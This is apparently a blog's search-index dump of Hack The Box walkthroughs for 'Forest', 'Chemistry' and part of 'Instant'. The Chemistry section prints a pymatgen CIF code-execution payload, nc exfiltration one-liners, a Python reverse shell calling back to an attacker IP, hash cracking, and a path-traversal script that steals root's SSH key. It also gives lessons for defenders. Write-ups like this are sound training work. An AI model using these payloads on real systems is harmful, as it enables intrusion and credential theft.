NT_HASH=$(grep -i Administrator loot/secretsdump.ntds | cut -d &#39;:&#39; -f 4) evil-winrm -i $RADDR -u Administrator -H $NT_HASH And there&rsquo;s the flag! &#x1f44f;
That was tricky, but a great lesson in attacking Active Directory.
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; I&rsquo;ll also revert to my regular time settings:
sudo timedatectl set-ntp on LESSONS LEARNED Attacker &#x1f436; Use Bloodhound as soon as you have AD credentials. This wasn&rsquo;t really a &ldquo;lesson learned&rdquo;, but it&rsquo;s definitely worth repeating. Bloodhound will help you navigate the very complex AD attack surface.
&#x1f48e; Use high-value-target nodes as waypoints in Bloodhound. Out-of-the box, the shortest path queries in Bloodhound might tempt you to ignore paths that are still totally viable, but not strictly the shortest path. My advice is to calculate shortest paths between high-value-targets, and compare the resulting paths to the &ldquo;shortest&rdquo; path - sometimes you&rsquo;ll find a better or easier way! After all, the definition of &ldquo;shortest&rdquo; seems to consider implicit relationships/edges (like Member-of) with the same weight as edges that need exploitation.
Defender &#x1f47b; Null / anonymous authentication should be disabled. On this box, we were able to enumerate the domain a bit because smb allowed null authentication. This is really easy to avoid - but if a system is left in this state, it makes the attacker&rsquo;s job much easier.
&#x1f512; Keep Kerberos preauthentication enabled. If you disable it, you&rsquo;re opening up your systems to an ASREPRoasting attack.
&#x1f423; Watch out for nested groups. The AD environment can get very complicated (and overly permissive) if you nest groups too deeply. Instead of using nested groups, consider using group policy objects (GPOs) attached to organizational units (OUs).
`,url:"https://4wayhandshake.github.io/walkthrough/forest/"},"https://4wayhandshake.github.io/walkthrough/chemistry/":{title:"Chemistry",tags:["CIF file","Command Injection","Password Cracking"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Chemistry was released as the penultimate box of HTB&rsquo;s season 6, Heist. It&rsquo;s about breaking into a custom service for analyzing a scientific data file. Maybe you&rsquo;ve seen tools like this before, where some expert in a non-tech field knows just enough coding to solve a problem for themselves? It&rsquo;s admirable that people do this type of thing, but these tools are often doomed by poor security - as we&rsquo;ll see in this box.
Foothold is 99% of Chemistry. Unless you&rsquo;re incredibly clever, it requires a little bit of research to discover a particular vulnerability disclosure, and utilize the PoC that the disclosure provides. The exploit from the PoC is quite limited, however, and will require careful usage to actually gain us a shell. Thankfully, if you build up to your foothold in a series of small steps, it should be relatively easy.
Unlike many &ldquo;Easy&rdquo; boxes, there is actually a small escalation from the service account that you use for foothold, to a low-privilege human user. Some very simple local enumeration will uncover a database, and inside are hashes that are trivial to crack - one of them leads to the next user
Privilege escalation to root is&hellip; almost not even worth mentioning &#x1f602; Just look through the filesystem for a suspicious script and run it.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp No web server, eh? That&rsquo;s interesting!
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA) |_ 256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/3.0.3 Python/3.9.5 | Date: Thu, 24 Oct 2024 04:38:29 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 719 | Vary: Cookie | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;UTF-8&#34;&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; | &lt;title&gt;Chemistry - Home&lt;/title&gt; | &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/styles.css&#34;&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;div class=&#34;container&#34;&gt; | class=&#34;title&#34;&gt;Chemistry CIF Analyzer&lt;/h1&gt; | &lt;p&gt;Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.&lt;/p&gt; | &lt;div class=&#34;buttons&#34;&gt; | &lt;center&gt;&lt;a href=&#34;/login&#34; class=&#34;btn&#34;&gt;Login&lt;/a&gt; | href=&#34;/register&#34; class=&#34;btn&#34;&gt;Register&lt;/a&gt;&lt;/center&gt; | &lt;/div&gt; | &lt;/div&gt; | &lt;/body&gt; | RTSPRequest: | &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 4.01//EN&#34; | &#34;http://www.w3.org/TR/html4/strict.dtd&#34;&gt; | &lt;html&gt; | &lt;head&gt; | &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html;charset=utf-8&#34;&gt; | &lt;title&gt;Error response&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;h1&gt;Error response&lt;/h1&gt; | &lt;p&gt;Error code: 400&lt;/p&gt; | &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt; | &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt; | &lt;/body&gt; |_ &lt;/html&gt; Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No additional info from the vuln scan
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR No results from the UDP scan
Webserver Strategy Nmap didn&rsquo;t show any redirect for port 5000, but for convenience I&rsquo;ll add an entry /etc/hosts and do banner grabbing on that domain:
DOMAIN=chemistry.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts whatweb --aggression 3 http://$DOMAIN:5000 &amp;&amp; curl -IL http://$RADDR:5000 That&rsquo;s a slightly old version of Python, but a current version of Werkzeug.
Next I&rsquo;ll perform vhost and subdomain enumeration. First, I&rsquo;ll check for alternate hosts:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v None were found. But frankly, we weren&rsquo;t expecting any against a Python + Werkzeug ( + Flask probably) webserver; they don&rsquo;t usually define vhosts.
Next I&rsquo;ll check for subdomains of chemistry.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://chemistry.htb:5000.
First, directory enumeration:
I prefer to not run a recursive scan, so that it doesn&rsquo;t get hung up on enumerating CSS and images.
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN:5000/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-root -of json -timeout 4 Uzing ZAP to quickly spider the site, we achieve results that also indicate the POST parameters:
Exploring the Website The landing page is very simple, allowing us only to register or login. After a login, we should be redirected to the Dashboard
To try it out, I&rsquo;ll register a user:
The Dashboard allows us to upload .CIF files. Thankfully, they provide an example file at /static/example.cif:
Downloading the example file, we can see that it&rsquo;s there&rsquo;s basically no file metadata, just some stuff that probably gets parsed in Python. Notably, they&rsquo;re using a custom Content-Type header:
HTTP/1.1 200 OK Server: Werkzeug/3.0.3 Python/3.9.5 Date: Thu, 24 Oct 2024 05:43:11 GMT Content-Disposition: inline; filename=example.cif Content-Type: chemical/x-cif Content-Length: 376 Last-Modified: Wed, 09 Oct 2024 20:13:53 GMT Cache-Control: no-cache ETag: &#34;1728504833.9929953-376-2511866491&#34; Date: Thu, 24 Oct 2024 05:43:11 GMT Connection: close data_Example _cell_length_a 10.00000 _cell_length_b 10.00000 _cell_length_c 10.00000 _cell_angle_alpha 90.00000 _cell_angle_beta 90.00000 _cell_angle_gamma 90.00000 _symmetry_space_group_name_H-M &#39;P 1&#39; loop_ _atom_site_label _atom_site_fract_x _atom_site_fract_y _atom_site_fract_z _atom_site_occupancy H 0.00000 0.00000 0.00000 1 O 0.50000 0.50000 0.50000 1 After uploading the example.cif file, we can see an entry on the dashboard. It has uploaded to a file with a random filename, but the entry on the dashboard shows the filename we provided:
When we view the structure from example.cif that we just uploaded, we can see a couple of calculated values, volume and density. It&rsquo;s probably a fair assumption that volume is simply a * b * c, but density looks more complicated:
&#x261d;&#xfe0f; Regardless of how they&rsquo;re calculated, what&rsquo;s important is that we have calculated values that are being rendered based on user-controllable inputs.
So far, I see a few things we might be able to attack:
The filename. We might be able to do a stored XSS via this parameter, but it&rsquo;s unclear if that would gain us anything. The calculated values Volume and Density: maybe we can find a way to sneak code into one of the user-controllable parameters, and gain RCE this way? FOOTHOLD Playing with the CIF File At first, I tried to execute python code written into the variables of the CIF file. I placed simple statements into all kinds of different positions of the CIF file, very similar to how you&rsquo;d test for SSTI&hellip;
My only findings were that I could use arbitrary text for the elements in the _atom_site_occupancy data, and that portions of the string would be reflected onto the page. We can change the dimensions of the crystal, but can&rsquo;t seem to inject commands into those values.
In hopes of traversing the imported modules within the server&rsquo;s python instance, I tried these payloads in various positions, too. If any of these were successful, we could build somewhat of a &ldquo;gadget chain&rdquo; in hopes of accessing something useful like os or subprocess:
[].class.base.subclasses() ''.class.mro()[1].subclasses() ''.__class__.__mro__[2].__subclasses__() self.__init__.__globals__.__builtins__ No luck with any of those!
Vulnerability Research &#x1f50d; Since my attempts at injecting code into the CIF file were unsuccessful, I started some web searching for known vulnerabilities in this file format. Eventually, I found this security advisory in the https://github.com/materialsproject/pymatgen Github repo, which documents a PoC for exploiting the parser for this file format:
data_5yOhtAoR _audit_creation_date 2018-06-08 _audit_creation_method &#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34; loop_ _parent_propagation_vector.id _parent_propagation_vector.kxkykz k1 [0 0 0] _space_group_magn.transform_BNS_Pp_abc &#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;touch pwned&#34;);0,0,0&#39; _space_group_magn.number_BNS 62.448 _space_group_magn.name_BNS &#34;P n&#39; m a&#39; &#34; The PoC executes a simple touch pwned command.
Testing the PoC Clearly, this is a blind attack - there is no reflected info to the website. Therefore, to test if it works, I&rsquo;ll use a payload that doesn&rsquo;t rely on reflected values:
_space_group_magn.transform_BNS_Pp_abc &#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;sleep 3&#34;);0,0,0&#39; I also did this with sleep 1, uploading two files.
It seems like, when I View each of the files, the sleep command actually executes. Here are the two requests to view each file:
We can see that they take 0.19s plus whatever sleep delay was added!
Extend the PoC Since this foothold will be blind, it might be useful to know whether or not cURL is on the target. Let&rsquo;s check, using this payload:
I started up an instance of my typical HTTP server on port 8000. Check it out at my github repo if you want to use it too. I&rsquo;m using it here because it&rsquo;ll automatically convert base64 data, and because it lives after more than one connection.
I&rsquo;ve also opened up port 8000 using ufw.
_space_group_magn.transform_BNS_Pp_abc &#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;curl http://10.10.14.17:8000/success&#34;);0,0,0&#39; I was having a lot of trouble getting any subshells to work within the payload, so I checked what was available using which combined with nc:
which nc curl wget base64 sh bash ash python python3 | nc 10.10.14.17 53 Aha! So base64 and bash are not even on the target. That explains the failure of several of my attempts to exfiltrate any data&hellip;
Regardless, I&rsquo;m not having any luck at all forming a reverse shell. Maybe I&rsquo;ll try to learn more about the target, using this nc channel that has proven reliable.
Let&rsquo;s do some basic enumeration:
id | nc 10.10.14.17 53 # uid=1001(app) gid=1001(app) groups=1001(app) &#x26a0;&#xfe0f; Through a little bit of testing, I&rsquo;m finding that it doesn&rsquo;t work with subshells. Pipes seem to work perfectly fine though.
Alright, that makes sense. Let&rsquo;s see if we can read env as a file:
nc 10.10.14.17 53 &lt; /proc/self/env # LANG=en_US.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/home/appLOGNAME=appUSER=appSHELL=/bin/bashINVOCATION_ID=24986dcd0cb74fbdbd9049da93c48384JOURNAL_STREAM=9:38060WERKZEUG_SERVER_FD=4 Ohh interesting - this user has a home directory. Let&rsquo;s list the contents:
ls -laR /home/app nc 10.10.14.17 53 This produced a lot of results, but here are the notable parts:
USER FLAG Planting an SSH Key &#x1f6ab; This didn&rsquo;t actually work. I&rsquo;m still not quite sure why. If you&rsquo;re short on time, skip ahead to the next section.
Since we know the app user has a home directory, maybe we can simply plant an SSH key to get a shell? First, I&rsquo;ll need to generate a keypair:
ssh-keygen -t rsa -b 4096 -f app_id_rsa -N &#34;p3lican&#34; cp app_id_rsa.pub ../www # Copy the pubkey over to the directory our http server is serving Now let&rsquo;s attempt to make an SSH directory and plant the pubkey. Here are the payloads:
mkdir /home/app/.ssh curl http://10.10.14.17:8000/app_id_rsa.pub -o /home/app/.ssh/id_rsa.pub I ran an extra payload to check that the pubkey landed where it should have (it did), so now we&rsquo;re ready to connect over SSH:
ssh -i ./app_id_rsa app@$RADDR Huh? Why isn&rsquo;t it accepting key-based authentication? Is it explicitly disabled or something? The permissions on both files of the keypair are correct.
Oh well, may as well try something else&hellip; &#x1f614;
Python Reverse Shell Since we&rsquo;ve already demonstrated we can write files using cURL, and that python3 is present on the target, why not simply download a python script and run it as a reverse shell?
My attempts to form a python reverse shell didn&rsquo;t work (using the payload from earlier). But those attempts were subject to whatever limitations the exploit had - and we already know that it didn&rsquo;t accomodate subshells. Maybe we&rsquo;ll have better luck running the reverse shell as a script?
First, I&rsquo;ll prepare revshell.py in my www directory, the directory that my http server is serving:
#!/usr/bin/python3 import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&#34;10.10.14.17&#34;,53)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty pty.spawn(&#34;sh&#34;) Next I&rsquo;ll start up a reverse shell listener:
sudo ufw allow from $RADDR to any port 53 proto tcp bash sudo su rlwrap nc -lvnp 53 Now I&rsquo;ll prepare another two .cif files - one with a payload to download the reverse shell, and another with a payload to run it:
curl http://10.10.14.17:8000/revshell.py -o /home/app/revshell.py python3 /home/app/revshell.py Running both of those, we finally see a reverse shell open:
database.db Now that we have a stable reverse shell, and don&rsquo;t need to worry about the limitations of the exploit, let&rsquo;s exfil that database we found:
Now, from the attacker host, we can open it up and see what we&rsquo;ve found:
SQLite version 3.46.0 2024-05-23 13:25:27 Enter &#34;.help&#34; for usage hints. sqlite&gt; .schema CREATE TABLE structure ( id INTEGER NOT NULL, user_id INTEGER NOT NULL, filename VARCHAR(150) NOT NULL, identifier VARCHAR(100) NOT NULL, PRIMARY KEY (id), FOREIGN KEY(user_id) REFERENCES user (id), UNIQUE (identifier) ); CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(150) NOT NULL, password VARCHAR(150) NOT NULL, PRIMARY KEY (id), UNIQUE (username) ); The user table looks like it has password hashes. I&rsquo;ll put them in a nice format and extract them:
.mode csv .separator : select username,password from user; Lucky us - those look like MD5 hashes! They should be trivial to crack &#x1f44d;
The list of users also contains rosa, who is the other user with a home directory on this box.
Password Cracking I&rsquo;ve copy-pasted those hashes (with the usernames) into database.hash. Under the assumption that they&rsquo;re regular MD5 hashes, I&rsquo;ll run hashcat over them:
hashcat -m 0 --username database.hash /usr/share/wordlists/rockyou.txt Seconds later, we have several results - including rosa:
The important credential is rosa : unicorniorosados. With any luck, this password will have been re-used for the local rosa account:
ssh rosa@$RADDR # unicorniorosados Excellent - we now have an SSH connection as rosa. The user flag is in /home/rosa, so go read it for some points:
cat /home/rosa/user.txt ROOT FLAG Local Enumeration - rosa A quick check to netstat shows there is another listening process, listening locally on port 8080:
Cross-referencing this with ps aux, we can be reasonably sure that this is the process running from /opt/monitoring_site/app.py:
root is running the server, and only root can access that directory. Let&rsquo;s forward the port and check it out.
Since I already have an SSH connection, the easiest way to forward the port is simply using SSH -L
ssh -L 8080:localhost:8080 rosa@$RADDR Now we should be able to access that port on localhost:
Monitoring Site &#x1f6ab; This section didn&rsquo;t lead towards privilege escalation. If you&rsquo;re short on time, skip to the next section.
Checking out the site The monitoring site looks like it was made quite hastily, possibly hinting that this is something we should attack? The Start Service, Stop Service, and Check Attacks buttons in the navbar seem like they&rsquo;re unimplemented - clicking any of them shows a message that the feature is not available.
The graphs on the Home page are completely static, so the only functionality that is actually implemented here is under List Services. Here&rsquo;s the javascript connected to that button:
$(&#39;#list-services&#39;).click(function() { $(&#39;.container &gt; div&#39;).hide(); $(&#39;#service-list&#39;).show(); $(&#39;#attack-logs&#39;).hide(); // Get list of services $(&#39;.loader&#39;).show(); $.get(&#39;/list_services&#39;, function(data) { $(&#39;.loader&#39;).hide(); var runningServices = []; var stoppedServices = []; // Separate running and stopped services // ... // Show running services // ... // Show stopped services // ... }); }); In short, it makes GET request to /list_services, then parses the results. Here&rsquo;s what that endpoint looks like:
That&rsquo;s interesting, but I don&rsquo;t really see anything out of the ordinary.
Enumerating the API Since there are unimplemented features in the frontend, there&rsquo;s a possibility that the developer created the backend first and just hasn&rsquo;t got around to finishing the frontend. We already know about GET /list_services; are there more?
Thankfully, Seclists has a good wordlist for enumerating APIs:
WLIST=/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt ffuf -w $WLIST:FUZZ -u http://localhost:8080/FUZZ -t 60 -ic -c -timeout 4 -mc all -fc 404 ffuf -w $WLIST:FUZZ -u http://localhost:8080/FUZZ -X POST -t 60 -ic -c -timeout 4 -mc all -fc 404 There weren&rsquo;t any significant results. If I get stuck, I might return to enumerating the API more - for now, I&rsquo;ll move on to something else.
Continuing local enumeration As I was downloading my toolbox into /tmp (to get a copy of pspy), I noticed something very odd sitting there:
The contents of expl.sh:
#!/bin/bash url=&#34;http://localhost:8080&#34; string=&#34;../&#34; payload=&#34;/assets/&#34; file=&#34;root/.ssh/id_rsa&#34; # without the first / for ((i=0; i&lt;15; i++)); do payload+=&#34;$string&#34; echo &#34;[+] Testing with $payload$file&#34; status_code=$(curl --path-as-is -s -o /dev/null -w &#34;%{http_code}&#34; &#34;$url$payload$file&#34;) echo -e &#34;\\tStatus code --&gt; $status_code&#34; if [[ $status_code -eq 200 ]]; then curl -s --path-as-is &#34;$url$payload$file&#34; break fi done &#x1f60f; Rosa&hellip; what have you been up to?
The above script is a pre-written exploit for the monitoring_site server. It applies a very simple path traversal to obtain the id_rsa key for root.
So what are we waiting for? Let&rsquo;s run it!
&#x1f602; Yep, that&rsquo;s right - rosa has been doing their own privesc work. Lucky us, eh? The script works flawlessly and dumps the SSH private key for root.
All we need to do is paste it into a file and fix the permissions on it:
vim loot/root_id_rsa # [paste the key] chmod 600 loot/root_id_rsa ssh -i loot/root_id_rsa root@$RADDR cat /root/root.txt Wow - privesc was ridiculously easy!
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm loot/database.db It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f5fa;&#xfe0f; Don&rsquo;t get too fixated on a certain route to RCE. On this box, I feel like I wasted a lot of time during foothold trying to test and understand the limitations of the CIF file exploit. If I could go back and do it again, I would have adjusted my approach as soon as I found a single working command like nc.
&#x1f463; Related to the above point, break your ideas up into small, testable steps. In the end, it will save a lot of time because you won&rsquo;t be checking and re-checking your assumptions over and over. Form a hypothesis, figure out a way to test it, prove it to yourself, then add it to your big bag of knowledge and keep moving forward.
Defender &#x1f489; Beware niche libraries that might not practice secure coding. I&rsquo;m sure the creators of the .CIF file interaction libraries were exceptionally good scientists, but nobody is an expert in everything&hellip; They followed very sloppy coding practices, using an eval() call to parse user-controllable inputs, leading to our ability to inject commands. The lesson here is mostly to monitor the health of open-source projects: for maximum security, we need active contribution from a good balance between people, of a wide variety of skillsets.
&#x23;&#xfe0f;&#x20e3; Hash passwords properly. Give some consideration to password hashing. In the end, the best password hashing balances the ease of legitimate password verification and difficulty of illicit password cracking. This box used unsalted MD5 for hashing passwords, which is laughably easy to crack (you can even just toss them into Crackstation.net). Better modern approaches would have been using bcrypt (with sufficient difficulty), or using **PBKDF2 with HMAC-SHA-512 **(also with sufficient difficulty). Check out the guidlines by OWASP for more info.
&#x270b; Permissions are only as useful as the most permissive thing a service has access to. On this box, we escalated privilege by using a very simple path traversal - so why was the monitoring_site able to access root&rsquo;s SSH key? This server should have been run as a service account, with limited permissions. Heck, even rosa had sufficient permissions to list the running services (service --status-all), so why was it granted root?
`,url:"https://4wayhandshake.github.io/walkthrough/chemistry/"},"https://4wayhandshake.github.io/walkthrough/instant/":{title:"Instant",tags:["Reverse Engineering","Android","APK","Java","Swagger","Local File Inclusion","Password Cracking","Solar-PuTTY"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION Instant was released for week 11 of HTB&rsquo;s Season 6, Heist. It&rsquo;s about a company that provides a money transfer service - both an app and an accompanying API. While it&rsquo;s marked as &ldquo;Medium&rdquo; box, I would personally rate this one more as an &ldquo;Easy&rdquo;. The most difficult aspect is having knowledge of the correct tools to use (and a bit of determination during enumeration).
The website urges us to download an app, in the form of an Android APK. By reverse-engineering this app, we find some poorly-protected secrets, but we can also find a couple subdomains that were (probably) previously unknown. One is the API that the app interacts with, and the other is a Swagger instance that documents the API. By analyzing the API and using a very basic attack, we can gain an easy foothold on the system.
Immediately after foothold, we can grab the user flag. From there, we can find the API&rsquo;s source code and gain access to the database it interacts with. As is often the case, we are able to dump password hashes from the database and set to work cracking them. Please check out my tool for transforming these hashes into a format that plays nicely with hashcat. Continuing with local enumeration, we discover a stray backup file from some popular IT management software. The credential recovered from hash cracking allows us to decrypt the backup file, and escalate privilege via an overly-permissive remote access session.
This box was pretty straightforward. The main skill that is exercised by this box is reverse engineering. If you need a quick box, or you&rsquo;re an RE enthusiast, this is the perfect box for you!
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA) |_ 256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519) 80/tcp open http Apache httpd 2.4.58 |_http-title: Did not follow redirect to http://instant.htb/ |_http-server-header: Apache/2.4.58 (Ubuntu) Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No new results from the vuln scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 69/udp open|filtered tftp 136/udp open|filtered tcpwrapped 158/udp open|filtered tcpwrapped 1026/udp open|filtered win-rpc 1701/udp open|filtered L2TP 2000/udp open|filtered tcpwrapped 5060/udp open|filtered sip 49193/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added instant.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=instant.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Next I&rsquo;ll perform vhost and subdomain enumeration. First, I&rsquo;ll check for alternate hosts:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v Next I&rsquo;ll check for subdomains of instant.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://instant.htb.
First, directory enumeration:
I prefer to not run a recursive scan, so that it doesn&rsquo;t get hung up on enumerating CSS and images.
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -v It&rsquo;s a little odd that they have both js and javascript directories, but other than that everything seems normal. It might be worth doing file enumeration on the /downloads directory.
Next I&rsquo;ll search for files in the downloads directory:
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/downloads/FUZZ -t 60 -ic -c -o fuzzing/ffuf-files-downloads -of json -e .php,.apk,.js,.html,.txt -timeout 4 -fs 276 Interesting&hellip; there&rsquo;s a file called instant.apk - clearly an Andoid application!
Exploring the Website The website is basically the landing page for an app. What they provide is basically just a crypto wallet and a transaction service. There are links all over the page directing us towards instant.apk, which we found during enumeration.
Scrolling down to the Blog section reveals that they&rsquo;ve made some updates to security recently, and they support Android and iOS:
instant.apk Let&rsquo;s try to take a look inside this package. For this task, I&rsquo;ll use apktool. I&rsquo;ll download the APK from http://instant.htb/downloads/instant.apk and place it in my source directory.
Next, I&rsquo;ll decompile the APK:
apktool d source/instant.apk -o source/instant That was successful, but we still don&rsquo;t have a java project that we can look at - for that, we&rsquo;ll need to use the handy dex2jar tool, which is bundled into kali as d2j-dex2jar:
cd source/instant d2j-dex2jar classes.dex While this reported some errors, it did actually produce a jar file for us. To view inside, we can use jd-gui. There are a lot of libraries inside here, but the app&rsquo;s source code is within the com.instantlabs.instant namespace:
A cursory check of the AdminActivities class reveals a subdomain that we didn&rsquo;t find during enumeration. Better yet, they&rsquo;re using a hardcoded Authorization header:
&#x1f914; It looks a lot like a JWT. Those usually have a Authorization: Bearer [jwt] format though&hellip;
